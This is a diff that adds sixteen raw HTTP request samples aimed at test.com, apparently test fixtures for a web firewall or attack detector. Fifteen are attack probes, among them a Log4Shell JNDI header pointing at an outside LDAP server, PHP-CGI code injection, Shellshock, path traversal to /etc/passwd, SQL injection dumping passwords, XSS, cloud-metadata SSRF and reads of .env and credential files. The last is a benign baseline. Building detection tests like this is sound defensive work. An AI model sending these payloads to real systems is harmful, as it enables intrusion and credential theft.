@@ -1,0 +1,258 @@
+########## 01_env_disclosure.txt ##########
+GET /.env HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 40.202.24.19
+Accept: */*
+User-Agent: Go-http-client/1.1
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 26.187.29.233,131.109.19.23
+X-Cloud-Trace-Context: 3d9c172411e20b8f6b0d549b6f03675a/5082513832886728665
+Next-Action: x
+X-Nextjs-Request-Id: 52e6b438
+
+
+########## 02_git_config.txt ##########
+GET /.git/config HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 110.30.63.243
+Accept: */*
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 163.31.203.13,58.23.68.75
+X-Cloud-Trace-Context: 1e27a1c08a6a63ec24ede6a46b4cb242/2845242645790811736
+
+
+########## 03_nextjs_mw_bypass.txt ##########
+GET /admin HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 145.92.52.149
+Accept: */*
+User-Agent: Go-http-client/1.1
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 165.96.190.25,142.32.30.159
+X-Cloud-Trace-Context: 881ed162ae2eb1547f15052434b9b5df/7168670181184942206
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+
+
+########## 04_next_action_probe.txt ##########
+POST / HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 121.232.185.77
+Accept: */*
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 205.92.124.21,149.153.253.225
+X-Cloud-Trace-Context: 49b64a0872e6cc3ababced2057ee05cd/9040517328716217596
+Next-Action: 7f2a1c9b0e
+X-Nextjs-Request-Id: 506bf2ef
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 22
+
+[{"env":"$$ACTION$$"}]
+
+########## 05_wp_login_bruteforce.txt ##########
+POST /wp-login.php HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 20.60.214.43
+Accept: */*
+User-Agent: python-requests/2.31.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 40.250.215.11,173.39.160.88
+X-Cloud-Trace-Context: 7f26144b98289fcd59a54a7bb1fee08f/7350031197456827163
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 39
+
+log=admin&pwd=admin123&wp-submit=Log+In
+
+########## 06_phpmyadmin_scan.txt ##########
+GET /phpmyadmin/index.php HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 118.35.47.242
+Accept: */*
+User-Agent: python-requests/2.31.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 123.33.31.188,181.158.228.73
+X-Cloud-Trace-Context: ab2cd31ee315128862c33a4fb774eb52/208106229431883325
+
+
+########## 07_actuator_env.txt ##########
+GET /actuator/env HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 120.181.86.157
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 128.30.111.197,75.66.126.102
+X-Cloud-Trace-Context: 7f1b103cdf1582b0eab477d26415479c/1534458142939740647
+
+
+########## 08_log4shell_header.txt ##########
+GET / HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 37.220.142.181
+Accept: */*
+User-Agent: curl/8.4.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 93.194.118.39,23.90.77.60
+X-Cloud-Trace-Context: 7c26847f0316909e3bbbe9eaa8948c89/5433705306041519150
+X-Api-Version: ${jndi:ldap://116.205.142.227:1389/a}
+
+
+########## 09_php_cgi_rce.txt ##########
+POST /index.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 48.134.144.2
+Accept: */*
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 109.189.163.244,34.27.233.231
+X-Cloud-Trace-Context: dfe01893f3aed0b6c7ac1491def88334/7359080603787602815
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+
+<?php system('id'); ?>
+
+########## 10_shellshock.txt ##########
+GET /cgi-bin/status HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 145.200.203.103
+Accept: */*
+User-Agent: curl/8.4.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 28.246.205.16,50.34.106.113
+X-Cloud-Trace-Context: 99c94309570dc1951c2442f9298cb3a5/944285119013034077
+X-Payload: () { :; }; /bin/bash -c 'id'
+
+
+########## 11_lfi_traversal.txt ##########
+GET /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 2.77.51.243
+Accept: */*
+User-Agent: python-requests/2.31.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 159.13.36.224,55.192.76.163
+X-Cloud-Trace-Context: 9a2ef80f58ee8571f4998d7c4093f6de/4373275378982703272
+
+
+########## 12_sqli_get.txt ##########
+GET /product?id=1%27+UNION+SELECT+username,password+FROM+users-- - HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 33.59.249.251
+Accept: */*
+User-Agent: curl/8.4.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 124.247.159.22,38.52.175.190
+X-Cloud-Trace-Context: b12aa1f6d42fddbb7a86f7a243c71b9a/4762345367261153902
+
+
+########## 13_xss_reflected.txt ##########
+GET /search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 7.105.185.38
+Accept: */*
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 141.13.152.251,166.46.133.133
+X-Cloud-Trace-Context: 5b0ee76f2ac34446e883a1d45de00997/2054900455814576406
+
+
+########## 14_ssrf_metadata.txt ##########
+GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 138.168.114.157
+Accept: */*
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 208.122.205.190,207.116.102.133
+X-Cloud-Trace-Context: 076b3e36bb2313f55b06258e7e26f36a/257674050322999590
+
+
+########## 15_aws_creds.txt ##########
+GET /.aws/credentials HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 204.143.241.67
+Accept: */*
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 179.176.228.207,187.178.186.21
+X-Cloud-Trace-Context: 785729763a12917c1a26f88938703800/3115078439910725085
+
+
+########## 16_benign_baseline.txt ##########
+GET / HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 125.0.245.233
+Accept: */*
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 90.43.61.233,101.102.244.228
+X-Cloud-Trace-Context: a2c68e45ca04c79f6f15b6ad2db3997f/800126162127804665
+X-Nextjs-Request-Id: 3451d013
+Purpose: prefetch
+
+
